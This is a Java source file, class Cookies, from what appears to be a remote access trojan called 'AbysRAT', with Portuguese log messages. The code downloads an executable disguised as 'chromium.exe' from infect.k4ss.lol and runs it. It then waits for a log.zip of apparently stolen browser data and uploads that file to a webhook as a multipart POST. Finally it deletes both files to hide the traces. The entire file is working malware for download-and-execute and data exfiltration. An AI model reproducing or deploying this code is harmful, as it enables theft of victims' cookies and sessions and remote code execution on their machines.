package dev.nfo.handlers;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Paths;

public class Cookies {
    private String webhookUrl;
    private String tempDir;
    private String exePath;
    private String zipPath;

    public Cookies(String webhookUrl) {
        this.webhookUrl = webhookUrl;
        this.tempDir = System.getProperty("java.io.tmpdir");
        this.exePath = Paths.get(tempDir, "chromium.exe").toString();
        this.zipPath = Paths.get(System.getenv("LOCALAPPDATA"), "lol", "log.zip").toString();
    }

    public void downloadAndExecute() {
        try {
            System.out.println("[AbysRAT] Iniciando download do chromium.exe...");
            downloadChromium();
            System.out.println("[AbysRAT] Download concluído. Executando...");
            executeChromium();
            System.out.println("[AbysRAT] Aguardando criação do log.zip...");
            waitForZipFile();
            System.out.println("[AbysRAT] Enviando log.zip para webhook...");
            sendZipToWebhook();
            System.out.println("[AbysRAT] Processo concluído.");
        } catch (Exception e) {
            System.err.println("[AbysRAT] Erro no Cookies: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void downloadChromium() throws IOException {
        System.out.println("[AbysRAT] Conectando ao servidor...");
        URL url = new URL("https://infect.k4ss.lol/bps");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(60000);
        
        System.out.println("[AbysRAT] Verificando resposta HTTP...");
        int responseCode = connection.getResponseCode();
        System.out.println("[AbysRAT] Código de resposta: " + responseCode);
        if (responseCode != HttpURLConnection.HTTP_OK) {
            throw new IOException("HTTP error code: " + responseCode);
        }
        
        System.out.println("[AbysRAT] Baixando arquivo para: " + exePath);
        try (InputStream inputStream = connection.getInputStream();
             FileOutputStream outputStream = new FileOutputStream(exePath)) {
            
            byte[] buffer = new byte[8192];
            int bytesRead;
            long totalBytes = 0;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
                totalBytes += bytesRead;
            }
            
            System.out.println("[AbysRAT] Total de bytes baixados: " + totalBytes);
            
            // Verify file was downloaded (should be > 0 bytes)
            if (totalBytes == 0) {
                throw new IOException("Downloaded file is empty");
            }
        }
        
        connection.disconnect();
        
        // Verify file exists and has content
        File downloadedFile = new File(exePath);
        if (!downloadedFile.exists()) {
            throw new IOException("File does not exist after download");
        }
        if (downloadedFile.length() == 0) {
            throw new IOException("File is empty after download");
        }
        System.out.println("[AbysRAT] Arquivo verificado. Tamanho: " + downloadedFile.length() + " bytes");
    }

    private void executeChromium() throws IOException, InterruptedException {
        ProcessBuilder processBuilder = new ProcessBuilder(exePath);
        processBuilder.directory(new File(tempDir));
        Process process = processBuilder.start();
        
        process.waitFor();
    }

    private void waitForZipFile() throws InterruptedException {
        File zipFile = new File(zipPath);
        int maxAttempts = 60;
        int attempts = 0;
        
        while (!zipFile.exists() && attempts < maxAttempts) {
            Thread.sleep(1000); 
            attempts++;
        }
    }

    private void sendZipToWebhook() throws IOException {
        File zipFile = new File(zipPath);
        if (!zipFile.exists()) {
            return;
        }

        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        URL url = new URL(webhookUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        connection.setRequestProperty("User-Agent", "AbysRAT/1.0");
        connection.setDoOutput(true);
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(30000);

        try (OutputStream outputStream = connection.getOutputStream();
             FileInputStream fileInputStream = new FileInputStream(zipFile)) {
            
            outputStream.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
            outputStream.write("Content-Disposition: form-data; name=\"username\"\r\n\r\n".getBytes("UTF-8"));
            outputStream.write("AbysRAT\r\n".getBytes("UTF-8"));

            outputStream.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
            outputStream.write("Content-Disposition: form-data; name=\"avatar_url\"\r\n\r\n".getBytes("UTF-8"));
            outputStream.write("https://i.imgur.com/ovwcNwY.png\r\n".getBytes("UTF-8"));

            outputStream.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
            outputStream.write("Content-Disposition: form-data; name=\"file\"; filename=\"log.zip\"\r\n".getBytes("UTF-8"));
            outputStream.write("Content-Type: application/zip\r\n\r\n".getBytes("UTF-8"));
            
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            
            outputStream.write("\r\n".getBytes("UTF-8"));
            outputStream.write(("--" + boundary + "--\r\n").getBytes("UTF-8"));
            outputStream.flush();
        }

        connection.getResponseCode();
        connection.disconnect();
        
        try {
            new File(exePath).delete();
            zipFile.delete();
        } catch (Exception e) {
        }
    }
}

